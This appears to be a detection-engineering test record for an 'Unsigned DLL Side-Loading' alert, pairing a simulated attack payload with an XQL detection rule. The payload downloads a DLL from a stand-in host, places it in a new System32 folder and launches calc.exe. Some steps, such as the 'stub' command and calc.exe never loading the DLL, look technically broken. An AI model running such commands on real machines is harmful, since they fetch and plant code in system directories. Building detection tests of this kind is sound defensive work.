identity.description: An attacker executes a legitimate application that loads an unsigned malicious DLL from a suspicious directory, triggering the Cortex 'Unsigned DLL Side-Loading' alert. The behavior is detected by monitoring process execution and DLL loading patterns.

payload.code:
cd C:\temp
wget https://example.com/malicious.dll -OutFile malicious.dll
stub malicious.dll
mkdir C:\Windows\System32\temp
move malicious.dll C:\Windows\System32\temp\malicious.dll
C:\Windows\System32\cmd.exe /c "C:\Windows\System32\calc.exe"

expected_artifacts.description: Legitimate process execution that loads unsigned DLL
Unsigned malicious DLL loaded by legitimate process

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unsigned DLL Side-Load
biocs.description: Detection of unsigned DLLs loaded by legitimate processes
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'calc.exe'
| filter action_file_path contains 'temp\malicious.dll'
| filter action_file_path not in (whitelisted_paths)
